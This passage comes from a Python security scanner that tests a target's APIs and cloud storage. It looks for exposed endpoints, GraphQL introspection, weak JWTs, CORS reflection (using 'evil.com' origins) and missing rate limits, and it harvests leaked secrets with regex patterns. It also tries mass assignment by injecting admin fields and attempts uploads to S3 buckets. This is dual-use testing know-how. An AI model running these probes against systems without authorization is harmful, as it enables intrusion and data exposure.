                    desc = f"WebSocket endpoint discovered at {ws_path}."
                    
                    if 'sec-websocket-accept' in response.lower():
                        # Upgrade was accepted even with evil.com origin
                        risk = RiskRating.HIGH
                        desc += " The endpoint accepted a WebSocket upgrade from an untrusted origin (evil.com), "
                        desc += "which may enable Cross-Site WebSocket Hijacking (CSWSH)."
                    
                    finding = Finding(
                        "WebSocket Endpoint Discovered",
                        desc,
                        risk,
                        "1. Validate the Origin header on WebSocket upgrade requests.\n"
                        "    2. Implement authentication on WebSocket connections.\n"
                        "    3. Use WSS (WebSocket Secure) instead of WS.\n"
                        "    4. Implement message-level authorization.",
                        "Web"
                    )
                    finding.add_evidence(f"Endpoint: {ws_path}")
                    self.report.add_finding(finding)
                    
            except:
                pass
        
        if not found_any:
            if self.verbose:
                print(f"{INFO} No WebSocket endpoints found")

# ==================== PHASE 4: API ====================
class APIScanner:
    """Phase 4: API Security Scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = target if target.startswith(('http://', 'https://')) else f"http://{target}"
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        import random
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
        ]
        self.session.headers.update({"User-Agent": random.choice(user_agents)})
        self.discovered_endpoints = []
        self.collected_responses = []
        
    def run(self):
        print(f"\n{INFO} Starting Phase 4: API Security Scan on {self.target}")
        
        # API Discovery
        self.check_api_endpoints()
        self.check_api_docs()
        
        # GraphQL Security
        self.check_graphql_introspection()
        
        # Authentication & Authorization
        self.check_jwt_security()
        self.check_api_cors()
        self.check_api_rate_limiting()
        
        # Data Exposure
        self.check_api_key_exposure()
        self.check_mass_assignment()
        
        print(f"{SUCCESS} Phase 4 completed")
        
    def check_api_endpoints(self):
        """Discover exposed API endpoints"""
        print(f"\n{INFO} Checking for exposed API endpoints")
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/api/v3/',
            '/graphql', '/graphql/', '/v1/', '/v2/', '/v3/',
            '/rest/', '/rest/v1/', '/api/users', '/api/v1/users',
            '/api/config', '/api/status', '/api/health', '/api/info',
            '/api/v1/config', '/api/admin', '/api/v1/admin',
            '/api/debug', '/api/internal', '/api/private',
            '/api/v1/me', '/api/user/profile', '/api/account'
        ]
        for path in api_paths:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5)
                content_type = response.headers.get('Content-Type', '')
                
                if response.status_code in [200, 401, 403] and ('json' in content_type or 'xml' in content_type):
                    print(f"{WARNING} API Endpoint Discovered: {path} (Status: {response.status_code})")
                    self.discovered_endpoints.append({'path': path, 'status': response.status_code, 'response': response})
                    
                    # Store responses for later analysis
                    if response.status_code == 200:
                        self.collected_responses.append(response)
                    
                    risk = RiskRating.MEDIUM
                    if 'admin' in path or 'internal' in path or 'private' in path or 'debug' in path:
                        risk = RiskRating.HIGH
                    
                    finding = Finding(
                        "API Endpoint Exposed",
                        f"Exposed API endpoint at {path} (Status: {response.status_code})",
                        risk,
                        "Ensure proper authentication and authorization on all API endpoints. "
                        "Restrict internal/admin APIs to authorized networks only.",
                        "API"
                    )
                    self.report.add_finding(finding)
            except:
                pass
                
    def check_api_docs(self):
        """Check for exposed API documentation"""
        print(f"\n{INFO} Checking for exposed API Documentation (Swagger/OpenAPI)")
        doc_paths = [
            '/swagger.json', '/openapi.json', '/api-docs', '/swagger-ui.html',
            '/v3/api-docs', '/api/swagger.json', '/swagger-ui/', '/swagger/',
            '/api/docs', '/docs', '/redoc', '/api/redoc',
            '/swagger-ui/index.html', '/swagger-resources',
            '/v2/api-docs', '/api-docs/swagger.json',
            '/.well-known/openapi.json', '/openapi.yaml'
        ]
        for path in doc_paths:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'openapi' in response.text.lower() or '"paths"' in response.text):
                    print(f"{CRITICAL} API Documentation Exposed: {path}")
                    
                    # Try to extract endpoint count
                    endpoint_count = response.text.count('"paths"')
                    
                    finding = Finding(
                        "API Documentation Exposed",
                        f"Swagger/OpenAPI documentation publicly accessible at {path}. "
                        f"This reveals the entire API structure, endpoints, parameters, and data models to attackers.",
                        RiskRating.HIGH,
                        "1. Restrict access to API docs to internal networks or authenticated developers.\n"
                        "    2. If docs must be public, remove sensitive endpoints and schemas.\n"
                        "    3. Use API gateway to filter documentation access.",
                        "API"
                    )
                    finding.add_evidence(f"URL: {url}")
                    self.report.add_finding(finding)
            except:
                pass

    def check_graphql_introspection(self):
        """Check if GraphQL introspection is enabled (exposes entire schema)"""
        print(f"\n{INFO} Checking for GraphQL Introspection")
        
        graphql_endpoints = ['/graphql', '/graphql/', '/api/graphql', '/gql', '/query', '/v1/graphql']
        
        introspection_query = {
            "query": '{ __schema { types { name fields { name type { name } } } } }'
        }
        
        for endpoint in graphql_endpoints:
            try:
                url = urljoin(self.target, endpoint)
                
                # Try POST with JSON
                response = self.session.post(
                    url,
                    json=introspection_query,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if response.status_code == 200 and '__schema' in response.text:
                    print(f"{CRITICAL} GraphQL Introspection ENABLED at {endpoint}")
                    
                    # Count exposed types
                    try:
                        data = response.json()
                        type_count = len(data.get('data', {}).get('__schema', {}).get('types', []))
                    except:
                        type_count = 'unknown'
                    
                    finding = Finding(
                        "GraphQL Introspection Enabled",
                        f"GraphQL introspection is enabled at {endpoint}, exposing the entire API schema "
                        f"including all types ({type_count}), queries, mutations, and data relationships. "
                        f"Attackers can map the full API surface without guessing.",
                        RiskRating.HIGH,
                        "1. Disable introspection in production (set introspection: false).\n"
                        "    2. Use query depth limiting and complexity analysis.\n"
                        "    3. Implement field-level authorization.\n"
                        "    4. Use a GraphQL-aware WAF.",
                        "API"
                    )
                    finding.add_evidence(f"Endpoint: {url}")
                    finding.add_evidence(f"Exposed types count: {type_count}")
                    self.report.add_finding(finding)
                    
                    # Also check for mutation exposure
                    mutation_query = {"query": '{ __schema { mutationType { fields { name } } } }'}
                    try:
                        mut_resp = self.session.post(url, json=mutation_query, headers={'Content-Type': 'application/json'}, timeout=5)
                        if mut_resp.status_code == 200 and 'mutationType' in mut_resp.text:
                            mut_data = mut_resp.json()
                            mutations = mut_data.get('data', {}).get('__schema', {}).get('mutationType', {})
                            if mutations and mutations.get('fields'):
                                mut_names = [f['name'] for f in mutations['fields'][:10]]
                                print(f"{WARNING} GraphQL mutations exposed: {', '.join(mut_names[:5])}")
                                finding = Finding(
                                    "GraphQL Mutations Exposed",
                                    f"GraphQL mutations are discoverable: {', '.join(mut_names)}",
                                    RiskRating.HIGH,
                                    "Implement authentication and authorization on all mutations.",
                                    "API"
                                )
                                self.report.add_finding(finding)
                    except:
                        pass
                    
                    break  # Found GraphQL, no need to check other endpoints
                    
            except:
                pass

    def check_jwt_security(self):
        """Analyze JWT tokens found in responses and cookies for security issues"""
        print(f"\n{INFO} Checking for JWT Token Security Issues")
        
        import base64
        
        jwt_tokens = []
        
        # Collect JWTs from cookies
        for cookie in self.session.cookies:
            if cookie.value and cookie.value.count('.') == 2:
                # Looks like a JWT (three dot-separated parts)
                jwt_tokens.append(('cookie:' + cookie.name, cookie.value))
        
        # Collect JWTs from response headers and bodies
        for resp in self.collected_responses:
            # Check Authorization header patterns in response
            auth_header = resp.headers.get('Authorization', '')
            if auth_header.startswith('Bearer ') and auth_header.count('.') == 2:
                jwt_tokens.append(('header:Authorization', auth_header.replace('Bearer ', '')))
            
            # Check response body for JWT patterns
            jwt_pattern = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text)
            for token in jwt_pattern[:3]:  # Limit to 3 tokens
                jwt_tokens.append(('response_body', token))
        
        # Also try to get a JWT by hitting common auth endpoints
        auth_endpoints = ['/api/auth/login', '/api/login', '/auth/token', '/oauth/token', '/api/v1/auth']
        for endpoint in auth_endpoints:
            try:
                url = urljoin(self.target, endpoint)
                # Send a dummy auth request to see if we get JWT back
                resp = self.session.post(url, json={'username': 'test', 'password': 'test'}, timeout=5)
                jwt_pattern = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text)
                for token in jwt_pattern[:1]:
                    jwt_tokens.append(('auth_response', token))
            except:
                pass
        
        if not jwt_tokens:
            if self.verbose:
                print(f"{INFO} No JWT tokens found to analyze")
            return
        
        for source, token in jwt_tokens:
            try:
                # Decode JWT header (first part)
                header_b64 = token.split('.')[0]
                # Add padding
                header_b64 += '=' * (4 - len(header_b64) % 4)
                header_json = base64.urlsafe_b64decode(header_b64)
                header = json.loads(header_json)
                
                # Decode JWT payload (second part)
                payload_b64 = token.split('.')[1]
                payload_b64 += '=' * (4 - len(payload_b64) % 4)
                payload_json = base64.urlsafe_b64decode(payload_b64)
                payload = json.loads(payload_json)
                
                alg = header.get('alg', 'unknown')
                
                # Check 1: Algorithm "none"
                if alg.lower() == 'none':
                    print(f"{CRITICAL} JWT uses 'none' algorithm (source: {source})")
                    finding = Finding(
                        "JWT Algorithm None Attack Possible",
                        f"JWT token from {source} uses algorithm 'none', allowing signature bypass. "
                        f"Attackers can forge arbitrary tokens.",
                        RiskRating.CRITICAL,
                        "1. Never accept 'none' algorithm.\n"
                        "    2. Enforce a specific algorithm server-side (e.g., RS256).\n"
                        "    3. Use a JWT library that rejects 'none' by default.",
                        "API"
                    )
                    self.report.add_finding(finding)
                
                # Check 2: Weak algorithm (HS256 with potentially guessable secret)
                if alg in ['HS256', 'HS384', 'HS512']:
                    print(f"{WARNING} JWT uses symmetric algorithm: {alg} (source: {source})")
                    finding = Finding(
                        "JWT Uses Symmetric Signing Algorithm",
                        f"JWT from {source} uses {alg}. If the secret key is weak or leaked, "
                        f"attackers can forge tokens. Asymmetric algorithms (RS256) are preferred.",
                        RiskRating.MEDIUM,
                        "1. Use asymmetric algorithms (RS256, ES256) instead.\n"
                        "    2. If HMAC is required, use a strong random secret (256+ bits).\n"
                        "    3. Rotate signing keys regularly.",
                        "API"
                    )
                    self.report.add_finding(finding)
                
                # Check 3: Token expiration
                exp = payload.get('exp')
                if exp is None:
                    print(f"{WARNING} JWT has no expiration claim (source: {source})")
                    finding = Finding(
                        "JWT Missing Expiration",
                        f"JWT from {source} has no 'exp' claim. Tokens without expiration "
                        f"remain valid indefinitely if compromised.",
                        RiskRating.HIGH,
                        "1. Always set 'exp' claim with a reasonable lifetime.\n"
                        "    2. Implement token refresh mechanism.\n"
                        "    3. Maintain a token revocation list.",
                        "API"
                    )
                    self.report.add_finding(finding)
                elif exp < time.time():
                    if self.verbose:
                        print(f"{INFO} JWT is expired (source: {source})")
                
                # Check 4: Sensitive data in payload
                sensitive_keys = ['password', 'secret', 'ssn', 'credit_card', 'cc_number', 'token', 'api_key', 'private_key']
                found_sensitive = [k for k in payload.keys() if any(s in k.lower() for s in sensitive_keys)]
                if found_sensitive:
                    print(f"{WARNING} JWT contains sensitive claims: {found_sensitive} (source: {source})")
                    finding = Finding(
                        "JWT Contains Sensitive Data",
                        f"JWT payload from {source} contains potentially sensitive claims: {', '.join(found_sensitive)}. "
                        f"JWT payloads are base64 encoded (NOT encrypted) and readable by anyone.",
                        RiskRating.HIGH,
                        "1. Never store sensitive data in JWT payloads.\n"
                        "    2. Use JWE (encrypted JWTs) if payload confidentiality is needed.\n"
                        "    3. Store sensitive data server-side, reference by ID only.",
                        "API"
                    )
                    self.report.add_finding(finding)
                    
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} JWT analysis failed for {source}: {str(e)}")

    def check_api_cors(self):
        """Check CORS configuration on discovered API endpoints"""
        print(f"\n{INFO} Checking API CORS Configuration")
        
        test_endpoints = [ep['path'] for ep in self.discovered_endpoints[:5]]
        if not test_endpoints:
            test_endpoints = ['/api/', '/api/v1/', '/graphql']
        
        evil_origins = ['https://evil.com', 'https://attacker.com', 'null']
        
        for endpoint in test_endpoints:
            url = urljoin(self.target, endpoint)
            for origin in evil_origins:
                try:
                    headers = {'Origin': origin}
                    response = self.session.options(url, headers=headers, timeout=5)
                    
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == '*':
                        print(f"{WARNING} API CORS wildcard at {endpoint}")
                        finding = Finding(
                            "API CORS Wildcard Origin",
                            f"API endpoint {endpoint} allows any origin (*) via CORS. "
                            f"If the API handles authenticated requests, this allows cross-origin data theft.",
                            RiskRating.MEDIUM if acac.lower() != 'true' else RiskRating.HIGH,
                            "1. Restrict CORS to specific trusted domains.\n"
                            "    2. Never combine wildcard origin with Allow-Credentials.\n"
                            "    3. Validate Origin header against a whitelist.",
                            "API"
                        )
                        self.report.add_finding(finding)
                        break
                    
                    elif acao == origin and origin != 'null':
                        print(f"{CRITICAL} API reflects arbitrary origin at {endpoint}")
                        finding = Finding(
                            "API CORS Reflects Arbitrary Origin",
                            f"API endpoint {endpoint} reflects the attacker-controlled Origin header '{origin}' "
                            f"in Access-Control-Allow-Origin. This defeats the purpose of CORS entirely.",
                            RiskRating.HIGH,
                            "1. Do NOT reflect the Origin header blindly.\n"
                            "    2. Validate against a strict whitelist of allowed origins.\n"
                            "    3. Return a fixed, trusted origin.",
                            "API"
                        )
                        finding.add_evidence(f"Sent Origin: {origin}")
                        finding.add_evidence(f"Received ACAO: {acao}")
                        if acac:
                            finding.add_evidence(f"Allow-Credentials: {acac}")
                        self.report.add_finding(finding)
                        break
                        
                    elif acao == 'null':
                        print(f"{WARNING} API CORS allows 'null' origin at {endpoint}")
                        finding = Finding(
                            "API CORS Allows Null Origin",
                            f"API endpoint {endpoint} allows 'null' as a valid CORS origin. "
                            f"Sandboxed iframes and local files send 'null' origin, enabling bypass.",
                            RiskRating.MEDIUM,
                            "Reject 'null' as a valid CORS origin.",
                            "API"
                        )
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass

    def check_api_rate_limiting(self):
        """Test if API endpoints have rate limiting"""
        print(f"\n{INFO} Testing API Rate Limiting")
        
        test_endpoints = [ep['path'] for ep in self.discovered_endpoints[:3]]
        if not test_endpoints:
            test_endpoints = ['/api/', '/api/v1/']
        
        for endpoint in test_endpoints:
            url = urljoin(self.target, endpoint)
            try:
                rate_limited = False
                responses = []
                
                # Send 20 rapid requests
                for i in range(20):
                    resp = self.session.get(url, timeout=5)
                    responses.append(resp.status_code)
                    
                    # Check for rate limiting indicators
                    if resp.status_code == 429:
                        rate_limited = True
                        break
                    
                    # Check rate limit headers
                    remaining = resp.headers.get('X-RateLimit-Remaining', 
                               resp.headers.get('X-Rate-Limit-Remaining',
                               resp.headers.get('RateLimit-Remaining', '')))
                    if remaining and int(remaining) <= 1:
                        rate_limited = True
                        break
                    
                    if 'retry-after' in resp.headers:
                        rate_limited = True
                        break
                
                if rate_limited:
                    if self.verbose:
                        print(f"{SUCCESS} Rate limiting detected on {endpoint}")
                else:
                    print(f"{WARNING} No rate limiting detected on {endpoint} (sent 20 rapid requests)")
                    finding = Finding(
                        "API Missing Rate Limiting",
                        f"API endpoint {endpoint} accepted 20 rapid consecutive requests without "
                        f"any rate limiting or throttling. This exposes the API to brute-force attacks, "
                        f"credential stuffing, and denial of service.",
                        RiskRating.MEDIUM,
                        "1. Implement rate limiting (e.g., token bucket or sliding window).\n"
                        "    2. Return HTTP 429 with Retry-After header when limits are exceeded.\n"
                        "    3. Use API gateway rate limiting (AWS API GW, Kong, etc.).\n"
                        "    4. Implement per-user and per-IP rate limits.",
                        "API"
                    )
                    finding.add_evidence(f"All 20 requests returned status codes: {set(responses)}")
                    self.report.add_finding(finding)
                    break  # Report once
                    
            except:
                pass

    def check_api_key_exposure(self):
        """Scan collected API responses for leaked secrets and API keys"""
        print(f"\n{INFO} Scanning API Responses for Exposed Secrets")
        
        # Patterns for common API keys and secrets
        secret_patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?i)aws(.{0,20})?[\'"][0-9a-zA-Z/+]{40}[\'"]',
            'Google API Key': r'AIza[0-9A-Za-z_-]{35}',
            'Google OAuth Token': r'ya29\.[0-9A-Za-z_-]+',
            'Stripe Secret Key': r'sk_live_[0-9a-zA-Z]{24,}',
            'Stripe Publishable Key': r'pk_live_[0-9a-zA-Z]{24,}',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,}',
            'GitHub Token': r'gh[pousr]_[A-Za-z0-9_]{36,}',
            'Mailgun API Key': r'key-[0-9a-zA-Z]{32}',
            'SendGrid API Key': r'SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}',
            'Twilio API Key': r'SK[0-9a-fA-F]{32}',
            'Private Key Block': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
            'Password Field': r'(?i)["\'](password|passwd|secret|api_key|apikey|access_token|auth_token)["\']:\s*["\'][^"\']{4,}["\']',
            'Generic Secret': r'(?i)(secret|token|key|api_key|apikey|password)\s*[:=]\s*["\'][a-zA-Z0-9/+=]{16,}["\']',
            'Firebase Config': r'(?i)firebase[A-Za-z]*\s*[:=]\s*["\'][A-Za-z0-9_-]+["\']',
        }
        
        found_any = False
        
        # Scan all collected responses
        for resp in self.collected_responses:
            response_text = resp.text
            for secret_name, pattern in secret_patterns.items():
                matches = re.findall(pattern, response_text)
                if matches:
                    print(f"{CRITICAL} {secret_name} found in API response!")
                    found_any = True
                    
                    # Mask the actual value for safe reporting
                    masked = str(matches[0])[:8] + '...' + str(matches[0])[-4:] if len(str(matches[0])) > 12 else '***REDACTED***'
                    
                    finding = Finding(
                        f"API Key/Secret Exposed: {secret_name}",
                        f"A {secret_name} pattern was found in an API response. "
                        f"Exposed credentials can be used to access third-party services, "
                        f"escalate privileges, or pivot to other systems.",
                        RiskRating.CRITICAL,
                        f"1. Immediately rotate the exposed {secret_name}.\n"
                        f"    2. Remove secrets from API responses.\n"
                        f"    3. Store secrets in environment variables or a secret manager.\n"
                        f"    4. Implement output filtering to prevent secret leakage.",
                        "API"
                    )
                    finding.add_evidence(f"Pattern matched: {secret_name}")
                    finding.add_evidence(f"Masked value: {masked}")
                    self.report.add_finding(finding)
        
        if not found_any:
            if self.verbose:
                print(f"{SUCCESS} No exposed secrets found in API responses")

    def check_mass_assignment(self):
        """Test for mass assignment vulnerabilities on API endpoints"""
        print(f"\n{INFO} Testing for Mass Assignment Vulnerabilities")
        
        # Common extra fields that shouldn't be user-controllable
        extra_fields = {
            'role': 'admin',
            'is_admin': True,
            'isAdmin': True,
            'admin': True,
            'privilege': 'admin',
            'permissions': 'all',
            'user_type': 'admin',
            'account_type': 'premium',
            'verified': True,
            'is_verified': True,
            'activated': True,
            'balance': 99999,
            'credit': 99999
        }
        
        # Test on discovered endpoints that might accept POST/PUT
        test_endpoints = ['/api/user', '/api/v1/user', '/api/profile', '/api/v1/profile',
                         '/api/account', '/api/v1/account', '/api/register', '/api/v1/register',
                         '/api/settings', '/api/v1/settings', '/api/update']
        
        for endpoint in test_endpoints:
            url = urljoin(self.target, endpoint)
            try:
                # Send a PATCH/PUT with extra privileged fields
                for method_func in [self.session.put, self.session.patch]:
                    try:
                        test_data = {
                            'name': 'asat_test_user',
                            'email': 'test@asat-security.test'
                        }
                        test_data.update(extra_fields)
                        
                        response = method_func(
                            url,
                            json=test_data,
                            timeout=5
                        )
                        
                        if response.status_code in [200, 201]:
                            try:
                                resp_data = response.json()
                                resp_str = json.dumps(resp_data).lower()
                                
                                # Check if privileged fields were accepted
                                privilege_indicators = ['admin', 'premium', 'verified', '99999']
                                if any(ind in resp_str for ind in privilege_indicators):
                                    print(f"{CRITICAL} Mass Assignment possible at {endpoint}")
                                    finding = Finding(
                                        "Mass Assignment Vulnerability",
                                        f"API endpoint {endpoint} accepts and processes privileged fields "
                                        f"(like role, is_admin) that should not be user-controllable. "
                                        f"Attackers can escalate privileges by including hidden fields in requests.",
                                        RiskRating.HIGH,
                                        "1. Use a whitelist of allowed fields for each endpoint.\n"
                                        "    2. Never bind request data directly to internal models.\n"
                                        "    3. Use DTOs (Data Transfer Objects) to filter input.\n"
                                        "    4. Implement field-level access control.",
                                        "API"
                                    )
                                    finding.add_evidence(f"Endpoint: {url}")
                                    finding.add_evidence(f"Injected fields: {list(extra_fields.keys())}")
                                    self.report.add_finding(finding)
                                    return  # Report once
                            except:
                                pass
                    except:
                        pass
            except:
                pass

# ==================== PHASE 5: CLOUD ====================
class CloudScanner:
    """Phase 5: Cloud Infrastructure & Bucket Hunting"""
    
    def __init__(self, target, report, verbose=False):
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f"http://{target}")
        self.domain = parsed.netloc or parsed.path
        self.domain = self.domain.replace('www.', '')
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # Generate common name variations from the domain
        self.base_name = self.domain.split('.')[0]
        self.name_variations = self._generate_name_variations()
        
    def _generate_name_variations(self):
        """Generate common cloud resource name permutations from the domain"""
        suffixes = [
            '', '-dev', '-development', '-test', '-testing', '-qa',
            '-prod', '-production', '-staging', '-stage', '-uat',
            '-backup', '-backups', '-bak', '-old', '-archive',
            '-assets', '-static', '-public', '-private', '-internal',
            '-media', '-images', '-img', '-uploads', '-files', '-docs',
            '-data', '-db', '-database', '-logs', '-api', '-app',
            '-web', '-www', '-cdn', '-content', '-config', '-temp',
            '-reports', '-exports', '-downloads', '-storage'
        ]
        return [f"{self.base_name}{s}" for s in suffixes]
        
    def run(self):
        """Execute all cloud infrastructure scan phases"""
        print(f"\n{INFO} Starting Phase 5: Cloud Infrastructure Scan for {self.domain}")
        
        # AWS S3 Bucket Hunting
        self.check_s3_buckets()
        
        # S3 Write Access Test
        self.check_s3_write_access()
        
        # Azure Blob Storage
        self.check_azure_blob()
        
        # GCP Storage Buckets
        self.check_gcp_storage()
        
        # DigitalOcean Spaces
        self.check_digitalocean_spaces()
        
        # Firebase Database Exposure
        self.check_firebase_db()
        
        # CloudFront Misconfiguration
        self.check_cloudfront_misconfig()
        
        print(f"{SUCCESS} Phase 5 completed")
    
    # ---- AWS S3 ----
    def check_s3_buckets(self):
        """Hunt for publicly listable AWS S3 buckets"""
        print(f"\n{INFO} Hunting for unprotected AWS S3 Buckets")
        
        found_buckets = []
        progress = ProgressIndicator(len(self.name_variations), "Scanning S3 Buckets")
        
        for bucket_name in self.name_variations:
            bucket_url = f"http://{bucket_name}.s3.amazonaws.com"
            try:
                time.sleep(0.1)
                response = self.session.get(bucket_url, timeout=5)
                
                if response.status_code == 200 and 'ListBucketResult' in response.text:
                    print(f"\n{CRITICAL} Public S3 Bucket Discovered (Listable): {bucket_url}")
                    found_buckets.append(bucket_name)
                    
                    # Try to extract some file names from the listing
                    file_keys = re.findall(r'<Key>(.*?)</Key>', response.text)
                    
                    finding = Finding(
                        "Public S3 Bucket (Listable)",
                        f"S3 Bucket '{bucket_name}' allows public directory listing, exposing all stored objects.",
                        RiskRating.CRITICAL,
                        "1. Enable S3 Block Public Access at account level.\n"
                        "    2. Review and restrict bucket ACLs and policies.\n"
                        "    3. Enable S3 access logging for audit.",
                        "Cloud"
                    )
                    if file_keys:
                        finding.add_evidence(f"Sample files found ({len(file_keys)} total): {', '.join(file_keys[:5])}")
                    finding.add_evidence(f"URL: {bucket_url}")
                    self.report.add_finding(finding)
                    
                elif response.status_code == 403 and 'AccessDenied' in response.text:
                    if self.verbose:
                        print(f"\n{INFO} S3 Bucket exists but access denied: {bucket_url}")
                        
            except:
                pass
            finally:
                progress.update()
        
        if not found_buckets:
            print(f"\n{SUCCESS} No publicly listable S3 buckets found")
    
    def check_s3_write_access(self):
        """Test if any discovered S3 buckets allow public write/upload"""
        print(f"\n{INFO} Testing S3 Buckets for Write Access")
        
        test_key = f"asat-write-test-{int(time.time())}.txt"
        test_content = "ASAT Security Test - This file was uploaded to verify write permissions. Safe to delete."
        
        for bucket_name in self.name_variations[:10]:  # Test top variations only
            bucket_url = f"http://{bucket_name}.s3.amazonaws.com"
            try:
                # First check if bucket exists
                head_resp = self.session.head(bucket_url, timeout=3)
                if head_resp.status_code in [403, 200]:
                    # Attempt PUT upload
                    put_url = f"{bucket_url}/{test_key}"
                    put_resp = self.session.put(
                        put_url,
                        data=test_content,
                        headers={'Content-Type': 'text/plain'},
                        timeout=5
                    )
                    
                    if put_resp.status_code in [200, 201, 204]:
                        print(f"{CRITICAL} S3 Bucket allows PUBLIC WRITE: {bucket_url}")
                        
                        # Try to clean up the test file
                        try:
                            self.session.delete(put_url, timeout=3)
                        except:
                            pass
                        
                        finding = Finding(
                            "S3 Bucket Public Write Access",
                            f"S3 Bucket '{bucket_name}' allows unauthenticated file uploads. "
                            f"Attackers can upload malicious content, deface hosted assets, or use the bucket for malware distribution.",
                            RiskRating.CRITICAL,
                            "1. Immediately remove public write ACL from the bucket.\n"
                            "    2. Enable S3 Block Public Access.\n"
                            "    3. Audit bucket for unauthorized objects.\n"
                            "    4. Enable versioning and MFA Delete.",
                            "Cloud"
                        )
                        finding.add_evidence(f"Write test URL: {put_url}")
                        self.report.add_finding(finding)
            except:
                pass
    
    # ---- Azure Blob Storage ----
    def check_azure_blob(self):
        """Hunt for publicly accessible Azure Blob Storage containers"""
        print(f"\n{INFO} Hunting for unprotected Azure Blob Storage Containers")
        
        common_containers = [
            'public', 'data', 'files', 'uploads', 'media', 'images',
            'assets', 'backup', 'backups', 'logs', 'downloads',
            'static', 'content', 'web', 'docs', 'reports', 'temp',
            'archive', 'exports', 'config', 'storage', '$web'
        ]
        
        found_any = False
        # Azure storage account names: use base name variations (max 24 chars, lowercase, no hyphens for account)
        account_names = [
            self.base_name.replace('-', '').lower()[:24],
            f"{self.base_name.replace('-', '').lower()[:20]}dev",
            f"{self.base_name.replace('-', '').lower()[:19]}prod",
            f"{self.base_name.replace('-', '').lower()[:18]}stage",
        ]
        
        for account in account_names:
            if not account or len(account) < 3:
                continue
                
            for container in common_containers:
                blob_url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
                try:
                    time.sleep(0.1)
                    response = self.session.get(blob_url, timeout=5)
                    
                    if response.status_code == 200 and 'EnumerationResults' in response.text:
                        print(f"{CRITICAL} Public Azure Blob Container: https://{account}.blob.core.windows.net/{container}")
                        found_any = True
                        
                        blob_names = re.findall(r'<Name>(.*?)</Name>', response.text)
                        
                        finding = Finding(
                            "Public Azure Blob Storage Container",
                            f"Azure Storage account '{account}', container '{container}' allows public listing of blobs.",
                            RiskRating.CRITICAL,
                            "1. Set container access level to 'Private'.\n"
                            "    2. Use Shared Access Signatures (SAS) for controlled access.\n"
                            "    3. Enable Azure Storage analytics logging.",
                            "Cloud"
                        )
                        if blob_names:
                            finding.add_evidence(f"Sample blobs: {', '.join(blob_names[:5])}")
                        self.report.add_finding(finding)
                        break  # Found one container in this account, move to next account
                        
                    elif response.status_code == 404:
                        break  # Account doesn't exist, skip remaining containers
                        
                except:
                    pass
        
        if not found_any:
            if self.verbose:
                print(f"{SUCCESS} No publicly listable Azure Blob containers found")
    
    # ---- GCP Storage ----
    def check_gcp_storage(self):
        """Hunt for publicly accessible Google Cloud Storage buckets"""
        print(f"\n{INFO} Hunting for unprotected GCP Storage Buckets")
        
        found_any = False
        progress = ProgressIndicator(len(self.name_variations), "Scanning GCP Buckets")
        
        for bucket_name in self.name_variations:
            gcp_url = f"https://storage.googleapis.com/{bucket_name}"
            try:
                time.sleep(0.1)
                response = self.session.get(gcp_url, timeout=5)
                
                if response.status_code == 200:
                    # Check if it returns XML listing or actual content
                    if 'ListBucketResult' in response.text or '<Contents>' in response.text:
                        print(f"\n{CRITICAL} Public GCP Bucket Discovered (Listable): {gcp_url}")
                        found_any = True
                        
                        file_keys = re.findall(r'<Key>(.*?)</Key>', response.text)
                        
                        finding = Finding(
                            "Public GCP Storage Bucket (Listable)",
                            f"GCP Storage Bucket '{bucket_name}' allows public directory listing.",
                            RiskRating.CRITICAL,
                            "1. Remove 'allUsers' and 'allAuthenticatedUsers' from bucket IAM.\n"
                            "    2. Use uniform bucket-level access.\n"
                            "    3. Enable audit logging on the bucket.",
                            "Cloud"
                        )
                        if file_keys:
                            finding.add_evidence(f"Sample files: {', '.join(file_keys[:5])}")
                        finding.add_evidence(f"URL: {gcp_url}")
                        self.report.add_finding(finding)
                        
                elif response.status_code == 403:
                    if self.verbose:
                        print(f"\n{INFO} GCP Bucket exists but access denied: {gcp_url}")
                        
            except:
                pass
            finally:
                progress.update()
        
        if not found_any:
            print(f"\n{SUCCESS} No publicly listable GCP Storage buckets found")
    
    # ---- DigitalOcean Spaces ----
    def check_digitalocean_spaces(self):
        """Hunt for publicly accessible DigitalOcean Spaces"""
        print(f"\n{INFO} Hunting for unprotected DigitalOcean Spaces")
        
        regions = ['nyc3', 'sfo3', 'ams3', 'sgp1', 'fra1', 'syd1', 'blr1']
        found_any = False
        
        # Only test a subset of name variations for each region to avoid excessive requests
        test_names = self.name_variations[:12]
        total = len(test_names) * len(regions)
        progress = ProgressIndicator(total, "Scanning DO Spaces")
        
        for bucket_name in test_names:
            for region in regions:
                space_url = f"https://{bucket_name}.{region}.digitaloceanspaces.com"
                try:
                    time.sleep(0.1)
                    response = self.session.get(space_url, timeout=5)
                    
                    if response.status_code == 200 and 'ListBucketResult' in response.text:
